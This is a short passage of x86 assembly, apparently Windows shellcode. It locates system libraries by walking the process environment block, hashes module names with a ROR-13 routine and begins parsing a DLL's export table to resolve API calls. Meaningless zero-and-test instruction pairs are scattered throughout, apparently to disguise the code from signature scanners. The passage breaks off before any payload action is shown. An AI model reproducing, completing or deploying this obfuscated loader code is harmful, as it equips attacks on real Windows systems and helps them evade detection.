```asm
_start:
    cld
    call L_95
RET_6:
    pushal
    lea ebp, [esp]
    mov edx, 0
    test edx, edx
    mov edx, dword ptr fs:[edx + 0x30]
    mov edx, dword ptr [edx + 0xc]
    mov edx, dword ptr [edx + 0x14]
L_15:
    mov edi, 0
    test edi, edi
    mov esi, dword ptr [edx + 0x28]
    movzx ecx, word ptr [edx + 0x26]
L_1e:
    mov eax, 0
    test eax, eax
    lodsb al, byte ptr [esi]
    cmp al, 0x61
    jl L_27
    sub al, 0x20
L_27:
    ror edi, 0xd
    add edi, eax
    dec ecx
    jne L_1e
    push edx
    push edi
    mov edx, dword ptr [edx + 0x10]
    mov eax, dword ptr [edx + 0x3c]
    add eax, edx
    mov eax, dword ptr [eax + 0x78]
    test eax, eax
    je L_8c
    add eax, edx
    mov ecx, dword ptr [eax + 0x18]
    push eax
    mov ebx, dword ptr [eax + 0x20]
    add ebx, edx
